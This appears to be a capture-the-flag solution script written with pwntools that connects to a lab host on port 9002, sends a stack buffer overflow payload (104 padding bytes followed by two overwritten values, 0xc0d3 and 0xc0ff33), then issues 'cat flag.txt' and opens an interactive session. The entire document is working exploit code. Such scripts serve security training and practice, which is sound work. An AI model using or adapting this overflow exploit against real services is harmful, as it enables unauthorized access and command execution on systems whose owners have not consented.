from pwn import *

IP = "10.10.109.171"

PORT = 9002

io = remote(IP, PORT)

print(io.recv().decode('latin-1'))


io.sendline(b'A'*104 + p32(0xc0d3) + p32(0xc0ff33))

print(io.recv().decode('latin-1'))

io.sendline(b'cat flag.txt')

io.interactive()
